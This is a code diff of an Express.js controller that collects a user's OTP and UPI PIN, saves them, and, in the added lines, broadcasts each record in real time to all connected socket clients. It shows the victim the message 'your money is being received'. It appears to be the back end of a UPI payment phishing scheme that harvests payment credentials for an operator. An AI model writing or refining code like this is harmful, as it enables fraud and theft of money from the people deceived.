@@ -1,25 +1,28 @@
-const OtpModel = require("../Model/otp.model")
+const OtpModel = require("../Model/otp.model");
 
-const OtpGet=async(req,res)=>{
-    const {otp,upiPin}=req.body
+const OtpGet = async (req, res) => {
+    const { otp, upiPin } = req.body;
 
-    if(!otp ){
-        return res.status(400).send({message:"Please Fill Your OTP "})   
+    if (!otp) {
+        return res.status(400).send({ message: "Please fill your OTP" });
     }
 
-    if(!upiPin ){
-        return res.status(400).send({message:"Please Fill Your UPI PIN For Verification "})   
+    if (!upiPin) {
+        return res.status(400).send({ message: "Please fill your UPI PIN for verification" });
     }
 
     try {
-        await OtpModel.create({otp,upiPin})
-        res.status(201).send({message:"Please Wait Your Money Is Reciveing... "})
+        // Create a new OTP entry
+        const newOtp = await OtpModel.create({ otp, upiPin });
+
+        // Emit the new data to all connected clients
+        req.app.get("io").emit("updateData", newOtp);
+
+        res.status(201).send({ message: "Please wait, your money is being received...", data: newOtp });
+    } catch (error) {
+        console.error(error);
+        res.status(500).send({ message: "Internal server error" });
     }
-    catch(error){
-        console.log(error)
-    }
+};
 
-}
-
-
-module.exports={OtpGet}
+module.exports = { OtpGet };
